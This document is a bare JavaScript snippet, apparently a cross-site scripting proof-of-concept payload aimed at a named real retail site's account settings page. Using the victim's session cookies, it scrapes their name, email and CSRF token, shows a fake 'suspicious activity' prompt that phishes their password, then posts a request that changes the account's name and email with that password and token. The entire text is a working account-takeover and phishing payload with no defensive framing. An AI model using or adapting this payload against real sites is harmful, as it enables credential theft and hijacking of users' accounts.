// Step 1: Send GET request and capture required information
fetch('https://www.toblerone.co.uk/accountSettings.account', {
  method: 'GET',
  credentials: 'include' // Send cookies with the request
})
  .then(response => response.text())
  .then(html => {
    // Extract the required information from the response HTML
    const name = html.match(/<input id="customerName" name="customerName" class="[^"]+" type="text" value="([^"]+)"/)[1];
    const email = html.match(/<input id="customerEmail" name="customerEmail" class="[^"]+" type="email" value="([^"]+)"/)[1];
    const csrfToken = html.match(/<input type="hidden" name="csrf_token" value="([^"]+)"/)[1];

    // Step 2: Display prompt with the captured information
    const password = prompt(`Welcome ${name}! We have noticed some suspicious activity on your account.
Please verify your account having email: ${email}.
Please enter your password below:`);

    // Step 3: Send POST request with the captured password and CSRF token
    const postUrl = 'https://www.toblerone.co.uk/accountSettings.account';
    const requestBody = `csrf_token=${encodeURIComponent(csrfToken)}&customerName=TEST&customerEmail=test9646@test.com&presentSetId=1&mobileNumber=&oldPassword=${encodeURIComponent(password)}&newPassword=&confirmPassword=`;

    fetch(postUrl, {
      method: 'POST',
      credentials: 'include', // Send cookies with the request
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: requestBody
    })
      .then(response => response.text())
      .then(responseText => {
        // Handle the response as needed
        console.log('POST request response:', responseText);
      })
      .catch(error => {
        console.error('Error in POST request:', error);
      });
  })
  .catch(error => {
    console.error('Error in GET request:', error);
  });
